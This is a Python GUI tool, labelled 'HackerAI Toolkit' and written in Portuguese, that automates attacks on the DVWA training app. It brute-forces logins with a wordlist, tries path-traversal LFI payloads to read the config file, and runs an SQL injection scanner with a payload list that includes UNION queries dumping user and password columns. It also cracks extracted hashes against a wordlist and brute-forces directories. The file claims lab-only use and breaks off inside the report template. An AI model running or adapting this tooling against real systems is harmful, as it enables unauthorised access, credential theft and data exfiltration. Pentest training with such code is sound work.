#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HackerAI Toolkit — DVWA Brute Force + LFI  |  SQLi Scanner
Interface única com duas abas, tema verde hacker + senhas em laranja-abóbora.
Uso autorizado apenas (laboratório / pentest com permissão).
Dependências: pip install requests

' OR '1'='1

"""

import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import urllib.parse
import re
import time
import html
import webbrowser
import hashlib
import os
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========================= TEMA =========================
BG      = "#050805"   # fundo geral
BG2     = "#0b120b"   # fundo de campos/áreas
FG      = "#00ff41"   # verde matrix
FG_DIM  = "#00b32d"   # verde escuro
ORANGE  = "#ff7518"   # laranja-abóbora (senhas)
SEL     = "#003b00"   # seleção
BTN     = "#0a1a0a"   # botão normal
BTN_ACT = "#004d00"   # botão ativo
MONO    = "Consolas"


def apply_theme(root):
    root.configure(bg=BG)
    style = ttk.Style()
    try:
        style.theme_use("clam")
    except tk.TclError:
        pass

    style.configure(".",
                    background=BG, foreground=FG,
                    fieldbackground=BG2, bordercolor=FG_DIM,
                    lightcolor=FG_DIM, darkcolor=BG, troughcolor=BG2,
                    focuscolor=FG, font=(MONO, 10))
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=(MONO, 10))
    # rótulos de senha (wordlist) em laranja-abóbora
    style.configure("Orange.TLabel", background=BG, foreground=ORANGE,
                    font=(MONO, 10, "bold"))
    style.configure("TLabelframe", background=BG, bordercolor=FG_DIM)
    style.configure("TLabelframe.Label", background=BG, foreground=FG,
                    font=(MONO, 10, "bold"))
    style.configure("TButton", background=BTN, foreground=FG,
                    bordercolor=FG_DIM, focuscolor=FG, font=(MONO, 10, "bold"))
    style.map("TButton",
              background=[("active", BTN_ACT), ("disabled", "#101010")],
              foreground=[("disabled", "#2e4d2e")])
    style.configure("TEntry", fieldbackground=BG2, foreground=FG,
                    insertcolor=FG, bordercolor=FG_DIM)
    style.configure("TNotebook", background=BG, bordercolor=FG_DIM, tabmargins=[2, 5, 2, 0])
    style.configure("TNotebook.Tab", background=BTN, foreground=FG_DIM,
                    padding=(18, 7), font=(MONO, 10, "bold"))
    style.map("TNotebook.Tab",
              background=[("selected", BG2)],
              foreground=[("selected", FG)])
    style.configure("TProgressbar", background=FG, troughcolor=BG2,
                    bordercolor=FG_DIM, lightcolor=FG, darkcolor=FG)


def make_log(parent):
    """ScrolledText com tema escuro verde e tag 'pwd' em laranja-abóbora."""
    w = scrolledtext.ScrolledText(
        parent, state="disabled", font=(MONO, 9),
        bg=BG2, fg=FG, insertbackground=FG,
        selectbackground=SEL, selectforeground=FG,
        highlightbackground=FG_DIM, highlightcolor=FG,
        relief="flat", borderwidth=0,
    )
    w.tag_config("pwd", foreground=ORANGE, font=(MONO, 9, "bold"))
    return w


# --------- destaque automático de senhas no log ---------
PWD_RES = [
    re.compile(r"Testando:\s*\S+?:(\S+)"),            # brute force: user:senha
    re.compile(r"CREDENCIAL VÁLIDA:\s*(\S+\s*/\s*\S+)"),  # credencial achada
    re.compile(r"CRACKED\s+\S+\s*=>\s*(\S+)"),        # hash quebrado
    re.compile(r"Admin[:/]\s*(\S+)"),                 # variações "admin:senha"
]


def _pwd_spans(line):
    spans = []
    for rx in PWD_RES:
        for m in rx.finditer(line):
            if m.group(1):
                spans.append((m.start(1), m.end(1)))
    return spans


def log_insert(widget, msg, tag="pwd"):
    """Insere texto no log, senhas destacadas em laranja-abóbora."""
    widget.configure(state="normal")
    lines = msg.split("\n")
    for i, line in enumerate(lines):
        spans = _pwd_spans(line)
        pos = 0
        for s, e in spans:
            if s > pos:
                widget.insert("end", line[pos:s])
            widget.insert("end", line[s:e], tag)
            pos = e
        widget.insert("end", line[pos:])
        if i < len(lines) - 1:
            widget.insert("end", "\n")
    widget.insert("end", "\n")
    widget.see("end")
    widget.configure(state="disabled")


# ####################################################################
# ABA 1 — DVWA BRUTE FORCE + LFI
# ####################################################################
class DvwaTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=8)
        self.running = False
        self.session = requests.Session()
        self._build_ui()

    def _build_ui(self):
        frame = ttk.LabelFrame(self, text=" Configuração — Brute Force + LFI ", padding=10)
        frame.pack(fill="x", padx=5, pady=5)

        ttk.Label(frame, text="URL Login:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frame, width=58)
        self.url_entry.insert(0, "http://192.168.0.11/dvwa/login.php")
        self.url_entry.grid(row=0, column=1, pady=3)

        # rótulo de senha em laranja-abóbora
        ttk.Label(frame, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=1, column=0, sticky="w")
        self.wordlist_entry = ttk.Entry(frame, width=58)
        self.wordlist_entry.grid(row=1, column=1, pady=3)
        ttk.Button(frame, text="Procurar...", command=self._browse).grid(row=1, column=2, padx=6)

        ttk.Label(frame, text="Usuário:").grid(row=2, column=0, sticky="w")
        self.user_entry = ttk.Entry(frame, width=30)
        self.user_entry.insert(0, "admin")
        self.user_entry.grid(row=2, column=1, sticky="w", pady=3)

        ttk.Label(frame, text="Arquivo alvo (LFI):").grid(row=3, column=0, sticky="w")
        self.file_entry = ttk.Entry(frame, width=58)
        self.file_entry.insert(0, "/var/www/dvwa/config/config.inc.php")
        self.file_entry.grid(row=3, column=1, pady=3)

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=4, column=1, sticky="w", pady=5)
        self.btn_start = ttk.Button(btn_frame, text=">> Iniciar", command=self.start)
        self.btn_start.pack(side="left", padx=3)
        self.btn_stop = ttk.Button(btn_frame, text="[] Parar", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=3)

        out_frame = ttk.LabelFrame(self, text=" Saída ", padding=5)
        out_frame.pack(fill="both", expand=True, padx=5, pady=5)
        self.log = make_log(out_frame)
        self.log.pack(fill="both", expand=True)

    def _browse(self):
        path = filedialog.askopenfilename(title="Selecione a wordlist de senhas")
        if path:
            self.wordlist_entry.delete(0, "end")
            self.wordlist_entry.insert(0, path)

    def log_msg(self, msg):
        log_insert(self.log, msg)

    def start(self):
        url = self.url_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        if not url or not wordlist:
            messagebox.showerror("Erro", "Informe a URL e a wordlist.")
            return
        if not os.path.isfile(wordlist):
            messagebox.showerror("Erro", "Wordlist não encontrada.")
            return
        self.session = requests.Session()
        self.running = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        threading.Thread(target=self.run, args=(url, wordlist), daemon=True).start()

    def stop(self):
        self.running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def _get_token(self, url):
        r = self.session.get(url, verify=False, timeout=10)
        m = re.search(r"user_token'?\s*value='([^']+)'", r.text)
        return m.group(1) if m else None

    def _save_found(self, content, tag):
        fname = f"encontrado_{tag}.txt"
        with open(fname, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        self.log_msg(f"[+] Conteúdo salvo em: {os.path.abspath(fname)}")

    def run(self, url, wordlist):
        base = url.rsplit("/", 1)[0]

        self.log_msg("[*] Fase 1: Brute force no login")
        creds = None
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f
                             if l.strip() and not l.lstrip().startswith("#")]
        except Exception as e:
            self.log_msg(f"[!] Erro ao ler wordlist: {e}")
            self._done()
            return

        self.log_msg(f"\n[*] {len(passwords)} senhas carregadas\n")

        for pwd in passwords:
            if not self.running:
                break
            try:
                token = self._get_token(url)
                data = {
                    "username": self.user_entry.get().strip(),
                    "password": pwd,
                    "Login": "Login",
                }
                if token:
                    data["user_token"] = token
                r = self.session.post(url, data=data, verify=False, timeout=10,
                                      allow_redirects=True)
                if "login.php" not in r.url and r.status_code == 200:
                    self.log_msg(f"\n[+] CREDENCIAL VÁLIDA: {data['username']} / {pwd}\n\n")
                    creds = (data["username"], pwd)
                    break
                self.log_msg(f"    Testando: {data['username']}:{pwd:<50} -> falha")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not creds:
            self.log_msg("\n[-] Nenhuma credencial encontrada. Continuando teste LFI sem login\n")

        target_file = self.file_entry.get().strip()
        self.log_msg(f"[*] Fase 2: Testando LFI para {target_file}\n")

        traversal = "../" * 6 + target_file.lstrip("/")
        candidates = [
            traversal,
            traversal.replace("../", "....//"),
            "/" + target_file.lstrip("/"),
            "..\\..\\" * 6 + target_file.lstrip("/"),
        ]

        lfi_url = f"{base}/vulnerabilities/fi/?page="
        found = False
        for payload in candidates:
            if not self.running or found:
                break
            try:
                r = self.session.get(lfi_url + payload, verify=False, timeout=10)
                if "db_" in r.text or "$_DVWA" in r.text or "config.inc" in r.text:
                    self.log_msg(f"[+] ARQUIVO ENCONTRADO via payload: {payload}")
                    self._save_found(r.text, "lfi_config")
                    found = True
                else:
                    self.log_msg(f"    Tentativa '{payload[:60]}...' -> sem conteúdo do config")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not found:
            self.log_msg("\n[-] LFI não confirmado. Verifique se está logado e se o nível")
            self.log_msg("    de segurança do DVWA está em: low     (http://SEU_IP/dvwa/security.php)\n")

        self._done()

    def _done(self):
        self.running = False
        self.after(0, lambda: (self.btn_start.configure(state="normal"),
                               self.btn_stop.configure(state="disabled")))
        self.log_msg("\n\n[*] Finalizado")


# ####################################################################
# ABA 2 — SQLi SCANNER
# ####################################################################
TIMEOUT = 10
RECON_THREADS = 5

PAYLOADS = [
    ("'", "Erro SQL clássico"),
    ("1'", "Erro de sintaxe após número"),
    ("1' AND extractvalue(1, concat(0x7e, version()))-- ", "Error-based MySQL extractvalue"),
    ("1' AND updatexml(1, concat(0x7e, version()), 1)-- ", "Error-based MySQL updatexml"),
    ("1' AND 1=CONVERT(int, @@version)-- ", "Error-based MSSQL"),
    ("' OR '1'='1", "Bypass clássico string"),
    ("1' OR '1'='1", "Bypass de autenticação (OR 1=1)"),
    ("1 OR 1=1", "Bypass numérico"),
    ("1' OR '1'='1' -- ", "Bypass com comentário"),
    ("' OR 1=1#", "Bypass hash comment"),
    ("admin'-- ", "Login bypass admin"),
    ("1 AND 1=1", "Booleano TRUE (baseline)"),
    ("1 AND 1=2", "Booleano FALSE"),
    ("1' AND '1'='1", "Booleano string TRUE"),
    ("1' AND '1'='2", "Booleano string FALSE"),
    ("1' AND SLEEP(5)-- ", "Time-based MySQL"),
    ("1 AND SLEEP(5)", "Time-based MySQL numérico"),
    ("1'; WAITFOR DELAY '0:0:5'-- ", "Time-based MSSQL"),
    ("1' AND pg_sleep(5)-- ", "Time-based PostgreSQL"),
    ("1' AND BENCHMARK(5000000, SHA1('t'))-- ", "Time-based BENCHMARK"),
    ("1 UNION SELECT NULL-- ", "UNION 1 coluna"),
    ("1 UNION SELECT NULL,NULL-- ", "UNION 2 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL-- ", "UNION 3 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL-- ", "UNION 4 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "UNION 5 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "UNION 6 colunas"),
    ("1' UNION SELECT NULL,NULL-- ", "UNION string 2 colunas"),
    ("1' UNION SELECT NULL,NULL,NULL-- ", "UNION string 3 colunas"),
    ("1' UNION SELECT version(),database()-- ", "UNION extraindo versão/banco"),
    ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- ", "UNION listando tabelas"),
    ("1' UNION SELECT user,password FROM users-- ", "UNION extraindo credenciais (DVWA)"),
    ("1' UNION SELECT @@version,@@datadir-- ", "UNION MSSQL/MySQL info"),
    ("1//OR//1=1", "Inline comments"),
    ("1 /*!50000OR*/ 1=1", "MySQL version comment"),
    ("1 OR 0x31=0x31", "Hex encoding"),
    ("1 %00OR 1=1", "Null byte"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "mysql_fetch", "pg_query",
    "sqlite3.operationalerror", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "syntax error", "unterminated string",
    "sqlsyntaxerrorexception", "error in your sql",
]

HASH_PATTERNS = [
    (r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}", "bcrypt"),
    (r"\$argon2(?:id|i|d)\$[^\s\"'<>]{20,}", "argon2"),
    (r"\b[a-fA-F0-9]{128}\b", "SHA-512"),
    (r"\b[a-fA-F0-9]{96}\b", "SHA-384"),
    (r"\b[a-fA-F0-9]{64}\b", "SHA-256"),
    (r"\b[a-fA-F0-9]{40}\b", "SHA-1"),
    (r"\b[a-fA-F0-9]{32}\b", "MD5"),
    (r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b", "JWT"),
]

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Scanner-GUI; Auth-Test)"


def extract_data(body):
    out = []
    for pattern in (
        r"ID:\s*([^<\r\n]+)",
        r"First\s*name:\s*([^<\r\n]+)",
        r"Surname:\s*([^<\r\n]+)",
    ):
        for item in re.findall(pattern, body, re.I):
            item = re.sub(r"<[^>]+>", "", item).strip()
            if item and item not in out:
                out.append(item)
    rows = re.findall(
        r"<tr[^>]*>\s*<td[^>]*>(.*?)</td>\s*<td[^>]*>(.*?)</td>",
        body, re.I | re.S,
    )
    for a, b in rows[:20]:
        a = re.sub(r"<[^>]+>", "", a).strip()
        b = re.sub(r"<[^>]+>", "", b).strip()
        if a or b:
            out.append(f"{a} | {b}")
    return list(dict.fromkeys(out))


def find_hashes(text):
    found = []
    seen = set()
    for pattern, htype in HASH_PATTERNS:
        for m in re.finditer(pattern, text):
            h = m.group(0)
            if h.lower() in seen:
                continue
            seen.add(h.lower())
            start = max(0, m.start() - 40)
            end = min(len(text), m.end() + 40)
            ctx = re.sub(r"\s+", " ", text[start:end]).strip()
            found.append((htype, h, ctx))
    return found


def algos_for_hash(h):
    n = len(h)
    if n == 32:
        return [("md5", hashlib.md5)]
    if n == 40:
        return [("sha1", hashlib.sha1)]
    if n == 64:
        return [("sha256", hashlib.sha256)]
    if n == 96:
        return [("sha384", hashlib.sha384)]
    if n == 128:
        return [("sha512", hashlib.sha512)]
    return []


class SqliTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=10)
        self.columnconfigure(1, weight=1)
        self.rowconfigure(6, weight=1)
        self._build_ui()
        self.results = []
        self.findings = []
        self.hash_findings = []
        self.recon_findings = []

    def _build_ui(self):
        ttk.Label(self, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url = ttk.Entry(self)
        self.url.grid(row=0, column=1, padx=5, sticky="ew")
        self.url.insert(
            0,
            "http://192.168.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
        )

        ttk.Label(self, text="Cookie:").grid(row=1, column=0, sticky="w")
        self.cookie = ttk.Entry(self)
        self.cookie.grid(row=1, column=1, padx=5, sticky="ew")
        self.cookie.insert(0, "PHPSESSID=329f6tjl62ekmjrpibd5kor3f5; security=low")

        ttk.Label(self, text="POST:").grid(row=2, column=0, sticky="w")
        self.post = ttk.Entry(self)
        self.post.grid(row=2, column=1, padx=5, sticky="ew")
        self.post.insert(0, "Submit=Submit")

        # rótulo de senha em laranja-abóbora
        ttk.Label(self, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=3, column=0, sticky="w")
        self.wordlist = ttk.Entry(self)
        self.wordlist.grid(row=3, column=1, padx=5, sticky="ew")
        ttk.Button(self, text="Procurar...", command=self.browse_wordlist).grid(
            row=3, column=2, padx=8, sticky="ew"
        )

        self.btn = ttk.Button(self, text=">> Escanear SQLi", command=self.start)
        self.btn.grid(row=0, column=2, rowspan=2, padx=8, sticky="ew")

        self.btn_crack = ttk.Button(self, text=">> Quebrar Hashes", command=self.start_crack)
        self.btn_crack.grid(row=4, column=0, columnspan=3, padx=0, pady=(6, 0), sticky="ew")

        self.progress = ttk.Progressbar(self, mode="determinate", maximum=100)
        self.progress.grid(row=5, column=0, columnspan=3, sticky="ew", pady=(6, 0))

        self.log = make_log(self)
        self.log.configure(wrap="none")
        self.log.grid(row=6, column=0, columnspan=3, sticky="nsew", pady=10)

        ttk.Button(self, text="[ Salvar relatório HTML ]", command=self.save).grid(
            row=7, column=1
        )

    # ---------- logging ----------
    def write(self, text):
        self.after(0, self._write, text)

    def _write(self, text):
        log_insert(self.log, text)

    def set_progress(self, value):
        value = max(0, min(100, value))
        self.after(0, lambda: self.progress.config(value=value))

    def busy(self, on):
        def _do():
            if on:
                self.progress.config(value=0)
                self.btn.config(state="disabled")
                self.btn_crack.config(state="disabled")
            else:
                self.progress.config(value=100)
                self.btn.config(state="normal")
                self.btn_crack.config(state="normal")
        self.after(0, _do)

    # ---------- cookies ----------
    def cookies(self):
        result = {}
        for item in self.cookie.get().split(";"):
            if "=" in item:
                k, v = item.strip().split("=", 1)
                result[k] = v
        return result

    def browse_wordlist(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist de senhas (ex.: rockyou.txt)",
            filetypes=[
                ("Listas de palavras", "*.txt *.lst *.wordlist"),
                ("Todos os arquivos", "*.*"),
            ],
        )
        if path:
            self.wordlist.delete(0, "end")
            self.wordlist.insert(0, path)
            size = os.path.getsize(path) if os.path.isfile(path) else 0
            self.write(f"[*] Wordlist selecionada: {path} ({size/1024/1024:.1f} MB)")

    def load_recon_wordlist(self, path):
        words, seen = [], set()
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    w = line.strip()
                    if not w or w.startswith("#"):
                        continue
                    w = w.lstrip("/")
                    if w in seen:
                        continue
                    seen.add(w)
                    words.append(w)
        except OSError as e:
            self.write(f"[ERRO] Lendo wordlist: {e}")
            return []
        return words

    # ---------- request helpers ----------
    def request_data(self, url, param, payload):
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        if qs:
            qs[param] = [payload]
            q = urllib.parse.urlencode(qs, doseq=True)
            return urllib.parse.urlunparse(p._replace(query=q)), None
        data = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
        if param not in data:
            return None, None
        data[param] = [payload]
        return url, data

    def send(self, url, data=None):
        t = time.time()
        try:
            if data is not None:
                r = session.post(url, data=data, timeout=TIMEOUT)
            else:
                r = session.get(url, timeout=TIMEOUT)
            return r, time.time() - t, None
        except requests.RequestException as e:
            return None, 0, str(e)

    # ========================= SQLi =========================
    def start(self):
        url = self.url.get().strip()
        if not url:
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.log.delete("1.0", "end")
        self.results.clear()
        self.findings.clear()
        self.hash_findings.clear()
        self.recon_findings.clear()
        self.busy(True)
        threading.Thread(target=self.scan, args=(url,), daemon=True).start()

    def scan(self, url):
        try:
            p = urllib.parse.urlparse(url)
            get = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            post = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
            params = get or post
            params = [x for x in params if x.lower() != "submit"]

            self.write(f"[*] Alvo: {url}")

            if not params:
                self.write("[!] Nenhum parâmetro encontrado.")
                return

            base, _, err = self.send(url, post if not get else None)
            base_len = len(base.text) if base else 0
            base_status = base.status_code if base else 0

            if err:
                self.write(f"[!] Request base: {err}")

            if base:
                for htype, h, ctx in find_hashes(base.text):
                    self._register_hash(htype, h, ctx, url)

            steps_per_param = 2 + len(PAYLOADS)
            total_steps = len(params) * steps_per_param
            done_steps = 0

            def tick():
                nonlocal done_steps
                done_steps += 1
                self.set_progress(int(done_steps * 100 / total_steps))

            self.set_progress(0)

            for param in params:
                self.write(f"\n[>] Testando: {param}\n")
                true_len = false_len = None

                for payload, tag in (("1 AND 1=1", "TRUE"), ("1 AND 1=2", "FALSE")):
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue
                    r, _, _ = self.send(u, data)
                    if not r:
                        continue
                    if tag == "TRUE":
                        true_len = len(r.text)
                    else:
                        false_len = len(r.text)

                blind = (true_len is not None and false_len is not None
                         and abs(true_len - false_len) > 20)
                if blind:
                    self.write(f"[+] Diferença booleana: TRUE={true_len} FALSE={false_len}")

                for payload, desc in PAYLOADS:
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue

                    r, elapsed, error = self.send(u, data)
                    if not r:
                        self.write(f"[-] {error}")
                        continue

                    body = r.text.lower()
                    vuln = None

                    for e in SQL_ERRORS:
                        if e in body:
                            vuln = f"Erro SQL: {e}"
                            break

                    if (not vuln and elapsed > 5 and any(
                            x in payload.lower()
                            for x in ("sleep", "waitfor", "benchmark", "pg_sleep"))):
                        vuln = f"Resposta lenta: {elapsed:.1f}s"

                    if (not vuln and true_len is not None and false_len is not None
                            and blind and ("1=1" in payload or "'1'='1" in payload)):
                        if (abs(len(r.text) - true_len) < 50
                                and "and" in payload.lower() and "1=2" not in payload):
                            vuln = "Resposta semelhante ao TRUE"

                    if (not vuln and ("or 1=1" in payload.lower() or "or '1'='1" in payload.lower())
                            and abs(len(r.text) - base_len) > 100):
                        vuln = f"Conteúdo alterado: {base_len} -> {len(r.text)} bytes"

                    if not vuln and "union select" in payload.lower():
                        if base_status and r.status_code != base_status:
                            vuln = f"UNION alterou status: {base_status}->{r.status_code}"
                        elif abs(len(r.text) - base_len) > 100:
                            vuln = "UNION alterou o conteúdo"

                    leaked = []
                    if vuln or any(x in payload.lower()
                                   for x in ("union select", "information_schema", "from users")):
                        leaked = extract_data(r.text)
                        for htype, h, ctx in find_hashes(r.text):
                            self._register_hash(htype, h, ctx, u)

                    item = (param, payload, r.status_code, elapsed,
                            bool(vuln), desc, vuln, len(r.text), leaked)
                    self.results.append(item)

                    if vuln:
                        self.findings.append((param, payload, desc, vuln, u, leaked))
                        self.write(f"\n[VULN] {param} | {payload[:35]} | {r.status_code} | {elapsed:.1f}s\n")
                        for x in leaked[:10]:
                            self.write(f"       {x}")
                    else:
                        self.write(f"\n\n[ OK ] {param} | {payload[:35]} | {r.status_code} | {elapsed:.1f}s\n")

                    time.sleep(0.15)

            self.write(f"\n[*] Concluído: {len(self.findings)} achados")
            if self.hash_findings:
                self.write(f"\n[*] Hashes encontrados: {len(self.hash_findings)}")

            path = self.wordlist.get().strip()
            self.auto_crack(path)
        except Exception as e:
            self.write(f"[ERRO] {e}")
        finally:
            self.busy(False)

    # ========================= HASHES =========================
    def _register_hash(self, htype, h, ctx, source):
        for item in self.hash_findings:
            if item[1].lower() == h.lower():
                return
        self.hash_findings.append((htype, h, ctx, source, None))
        self.write(f"[HASH] {htype}: {h}")

    # ========================= CRACKING =========================
    def build_targets(self):
        targets = {}
        for idx, (htype, h, ctx, source, cracked) in enumerate(self.hash_findings):
            candidates = algos_for_hash(h)
            if not candidates:
                continue
            targets.setdefault(h.lower(), []).append(idx)
        return targets

    def auto_crack(self, path):
        if not self.hash_findings:
            return
        if not path or not os.path.isfile(path):
            if self.hash_findings:
                self.write("\n\n[*] Nenhuma wordlist selecionada — hashes não serão quebrados automaticamente.")
            return
        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.\n")
            return
        self.write("\n[*] Wordlist detectada — iniciando cracking automático\n")
        self.run_crack(path, targets)

    def start_crack(self):
        if not self.hash_findings:
            self.write("[!] Nenhum hash encontrado ainda. Faça o Escanear SQLi primeiro\n")
            return
        path = self.wordlist.get().strip()
        if not path or not os.path.isfile(path):
            self.write("[!] Selecione uma wordlist válida (botão Procurar...).")
            return
        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.")
            return
        self.busy(True)
        self.write(f"[*] Iniciando ataque de dicionário\n[*] Wordlist: {path}\n\n"
                   f"[*] Hashes alvo: {len(targets)}\n")
        threading.Thread(target=self.crack_worker, args=(path, targets), daemon=True).start()

    def crack_worker(self, path, targets):
        try:
            self.run_crack(path, targets)
        finally:
            self.busy(False)

    def run_crack(self, path, targets):
        try:
            total_size = os.path.getsize(path)
            processed = 0
            found = {}
            remaining = set(targets.keys())
            start = time.time()

            self.write(f"[*] Wordlist: {path}\n\n[*] Hashes alvo: {len(targets)}\n\n")

            with open(path, "rb") as fh:
                for raw in fh:
                    word = raw.strip()
                    if not word:
                        continue
                    still = set(remaining)
                    for h in still:
                        for _, fn in algos_for_hash(h):
                            if fn(word).hexdigest() == h:
                                found[h] = word.decode("utf-8", "ignore")
                                remaining.discard(h)
                                break
                    processed += len(raw)
                    if processed % (1 << 20) < len(raw):
                        pct = int(processed * 100 / total_size) if total_size else 0
                        self.set_progress(pct)
                    if not remaining:
                        break

            elapsed = time.time() - start

            for h, word in found.items():
                for idx in targets[h]:
                    htype, hh, ctx, source, _ = self.hash_findings[idx]
                    self.hash_findings[idx] = (htype, hh, ctx, source, word)

            # senha quebrada em laranja-abóbora
            for h, word in found.items():
                self.write(f"[+] CRACKED  {h}  =>  {word}")
            for h in remaining:
                self.write(f"\n\n[-] Não quebrado: {h}")

            self.write(f"\n[*] Cracking concluído em {elapsed:.1f}s "
                       f"({len(found)}/{len(targets)} quebrados, {processed/1024/1024:.1f} MB lidos)\n\n")
        except Exception as e:
            self.write(f"[ERRO] Cracking: {e}")

    # ========================= RECON =========================
    def start_recon(self):
        url = self.url.get().strip()
        if not url:
            self.write("[!] Informe a URL alvo antes do recon.")
            return
        wordlist_path = filedialog.askopenfilename(
            title="Selecione a wordlist de diretórios/arquivos",
            filetypes=[("Listas de palavras", "*.txt *.lst *.wordlist"),
                       ("Todos os arquivos", "*.*")],
        )
        if not wordlist_path:
            self.write("[!] Recon cancelado: nenhuma wordlist selecionada.")
            return
        words = self.load_recon_wordlist(wordlist_path)
        if not words:
            self.write("[!] Wordlist vazia ou ilegível.")
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.recon_findings.clear()
        self.busy(True)
        self.write(f"[*] Recon em {url}\n[*] Wordlist: {wordlist_path} ({len(words)} entradas)\n")
        threading.Thread(target=self.recon, args=(url, words), daemon=True).start()

    def recon(self, url, words):
        total = len(words)
        done = 0
        try:
            base = url.rstrip("/") + "/"

            def probe(entry):
                target = entry if entry.startswith(("http://", "https://")) else urllib.parse.urljoin(base, entry)
                r, elapsed, err = self.send(target)
                return entry, target, r, elapsed, err

            with ThreadPoolExecutor(max_workers=RECON_THREADS) as pool:
                futures = {pool.submit(probe, w): w for w in words}
                for fut in as_completed(futures):
                    entry, target, r, elapsed, err = fut.result()
                    done += 1
                    if done % 25 == 0 or done == total:
                        self.write(f"[*] Progresso: {done}/{total}")
                    if err or not r:
                        continue
                    if r.status_code in (200, 301, 302, 401, 403, 500):
                        self.recon_findings.append((entry, r.status_code, len(r.text), elapsed, target))
                        self.write(f"[{r.status_code}] /{entry} ({len(r.text)} bytes, {elapsed:.1f}s)")
                        server = r.headers.get("Server")
                        if server:
                            self.write(f"      Server: {server}")
            self.write(f"\n[*] Recon concluído: {len(self.recon_findings)} recursos interessantes")
        except Exception as e:
            self.write(f"[ERRO] Recon: {e}")
        finally:
            self.busy(False)

    # ========================= REPORT =========================
    def save(self):
        if not self.results and not self.hash_findings and not self.recon_findings:
            self.write("[!] Nenhum resultado.")
            return
        filename = filedialog.asksaveasfilename(
            defaultextension=".html", filetypes=[("HTML", "*.html")]
        )
        if not filename:
            return

        rows = ""
        for (param, payload, status, elapsed, vuln, desc, detail, length, leaked) in self.results:
            color = "#3a0d0d" if vuln else "#0d3a12"
            badge = "VULNERÁVEL" if vuln else "OK"
            leak = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:15])
            rows += f"""
            <tr style="background:{color};color:#00ff41">
              <td>{html.escape(param)}</td>
              <td><code>{html.escape(payload)}</code></td>
              <td>{html.escape(desc)}</td>
              <td>{status}</td>
              <td>{length}</td>
              <td>{elapsed:.1f}s</td>
              <td><b>{badge}</b></td>
              <td>{html.escape(detail or "-")}<ul>{leak}</ul></td>
            </tr>
            """

        findings = ""
        for i, (param, payload, desc, detail, test_url, leaked) in enumerate(self.findings, 1):
            data = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:20])
            findings += f"""
            <div class="card">
              <h3>Achado #{i}</h3>
              <p><b>Parâmetro:</b> {html.escape(param)}</p>
              <p><b>Técnica:</b> {html.escape(desc)}</p>
              <p><b>Payload:</b> <code>{html.escape(payload)}</code></p>
              <p><b>Evidência:</b> {html.escape(detail)}</p>
              <p><b>URL:</b> {html.escape(test_url)}</p>
              <ul>{data}</ul>
            </div>
            """

        hashes = ""
        for htype, h, ctx, source, cracked in self.hash_findings:
            # senha quebrada em laranja-abóbora no relatório
            crack = (f'<b style="color:#ff7518">Quebrado: {html.escape(cracked)}</b>'
                     if cracked else "Não quebrado")
            hashes += f"""
            <div class="card" style="border-left-color:#00ff41">
              <h3>{html.escape(htype)}</h3>
              <p><b>Hash:</b> <code>{html.escape(h)}</code></p>
              <p><b>Contexto:</b> {html.escape(ctx)}</p>
              <p><b>Origem:</b> {html.escape(source)}</p>
              <p>{crack}</p>
            </div>
            """

        recon = ""
        for entry, status, length, elapsed, target in sorted(self.recon_findings, key=lambda x: x[1]):
            recon += f"""
            <tr>
              <td><code>/{html.escape(entry)}</code></td>
              <td>{status}</td>
              <td>{length}</td>
              <td>{elapsed:.1f}s</td>
              <td><code>{html.escape(target)}</code></td>
            </tr>
            """

        doc = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>Relatório SQLi</title>
<style>
